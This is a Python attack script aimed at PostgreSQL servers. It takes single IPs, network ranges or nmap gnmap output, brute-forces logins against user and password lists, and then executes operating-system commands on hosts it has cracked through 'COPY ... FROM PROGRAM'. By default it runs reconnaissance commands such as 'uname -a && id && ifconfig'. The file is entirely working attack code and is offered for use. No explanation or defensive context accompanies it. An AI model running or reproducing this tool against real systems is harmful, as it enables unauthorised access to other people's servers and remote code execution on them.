import argparse
import psycopg2
import re
import ipaddress

class Victim:
    def __init__(self, ip, port, username=None, password=None):
        self.ip = ip
        self.port = port
        self.username = username
        self.password = password

    def try_login(self, username='', password=''):
        return make_query(self.ip, self.port, username, password)

    def port_is_open(self):
        data = self.try_login()
        if data['message'] == 'timeout':
            print(self.ip, '- Timeout')
            return False
        else:
            return True

    # Bruteforce login/password lists
    # Sets self.username, self.password if valid
    # Returns True or False
    def bruteforce(self, userlist, passlist):
        for username in userlist:
            for password in passlist:
                data = self.try_login(username, password)
                if data['status'] == 'ok':
                    print("[+] Good credentials:", username + ":" + password)
                    self.username = username
                    self.password = password
                    self.add_version(data['message'])
                    return True
        return False

    def add_version(self, version):
        self.version = version
        self.major_version = int(re.findall(r'PostgreSQL (.*?)\.', version, re.IGNORECASE)[0])
        self.is_linux = any(x in version for x in ['linux', 'x86_64', 'Debian', 'Ubuntu'])

    def do_rce(self, command):
        if self.major_version >= 9:
            rce = self.do_rce_v9_v10(command)
            print("[!] RCE '" + command + "'")
            print(rce)
        elif self.major_version == 8:
            rce = self.do_rce_v8(command)
            print("[!] RCE '" + command + "'")
            print(rce)
        else:
            print("[-] PSQL version is too old")

    def do_rce_v9_v10(self, command):
        make_query(self.ip, self.port, self.username, self.password, "CREATE TABLE IF NOT EXISTS debugger (id text);")
        make_query(self.ip, self.port, self.username, self.password, "COPY debugger from program '" + command + "';")
        command_result = make_query(self.ip, self.port, self.username, self.password, "SELECT id FROM debugger;")
        make_query(self.ip, self.port, self.username, self.password, "DROP TABLE debugger;")

        return command_result['message']

    def do_rce_v8(self, command):
        return 'RCE v8 is not implemented yet'

# Make PSQL query
# Returns {'status': '', 'message': ''}
def make_query(host, port, user, password, query='SELECT version();'):
    _result = None
    try:
        try:
            conn = psycopg2.connect(host=host, port=port, user=user, password=password, connect_timeout=2, dbname='')
        except psycopg2.OperationalError as e:
            if "timeout expired" in str(e):
                return {'status': 'fail', 'message': 'timeout'}
            return {'status': 'fail', 'message': str(e)}

        cur = conn.cursor()
        cur.execute(query)

        if "select" in query.lower():
            list_results = []
            for row in cur.fetchall():
                list_results.append(row[0])
            _result = "\n".join(list_results)
        else:
            conn.commit()

        cur.close()
        conn.close()

        return { 'status': 'ok', 'message': _result }
    except psycopg2.Error as e:
        cur.close()
        conn.close()

        # print("[-] Could not '" + query + "' :", e)
        return { 'status': 'fail', 'message': str(e) }


# Parse CLI arguments
def parse_args():
    parser = argparse.ArgumentParser(description='Scan network for postgreses, bruteforce passwords, pwn.')
    parser.add_argument('targets', metavar='targets', type=str, nargs='+')
    parser.add_argument('--userlist', dest='userlist',
                        default=None, help='file with a list of users')
    parser.add_argument('--passlist', dest='passlist',
                        default=None, help='file with a list of passwords')
    parser.add_argument('--command', dest='command',
                        default=None, help='command to execute on a target machine')
    parser.add_argument('--port', dest='port',
                        default=None, help='port to connect')

    args = parser.parse_args()

    args.userlist = args.userlist if args.userlist else ['postgres']
    args.passlist = args.passlist if args.passlist else ['postgres', 'postgres1']
    args.command = args.command if args.command else ''
    args.port = args.port if args.port else 5432

    return args


# Parse gnmap file
# Returns (ip, port)
def parse_file_gnmap(file_path):
    try:
        with open(file_path, 'r') as w:
            data = w.read()

        parsed = re.findall(r'Host: ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}) .* ([0-9]{1,5})/', data)

        return parsed
    except FileNotFoundError:
        return ()


# Parse string from CLI arguments: ip/range/file.
# Returns [(ip, port)]
def parse_target(target, port=5432):
    try:
        ipaddress.ip_address(target)
        return [(target, port)]  # one IP
    except ValueError:
        try:
            ipaddress.ip_network(target)
            return map(lambda arg: (arg, port), ipaddress.ip_network(target).hosts())  # range /24. create [(host,port)]
        except ValueError:
            try:
                return parse_file_gnmap(target)  # local gnmap file
            except:
                print("Target is not IP or a Network. Try to re-set latest(s) bit, e.g. 8.8.0.0/16")
                exit()


def main():
    args = parse_args()
    command = args.command

    for target in args.targets:
        for ip, port in parse_target(target, args.port):
            print("[x] Starting host:", ip)
            victim = Victim(ip, port)
            if not victim.port_is_open():
                continue

            if victim.bruteforce(args.userlist, args.passlist):
                if not command:
                    if victim.is_linux:
                        command = 'uname -a && id && ifconfig'
                    else:
                        command = 'ipconfig && whoami /priv'
                victim.do_rce(command)

if __name__ == '__main__':
    main()
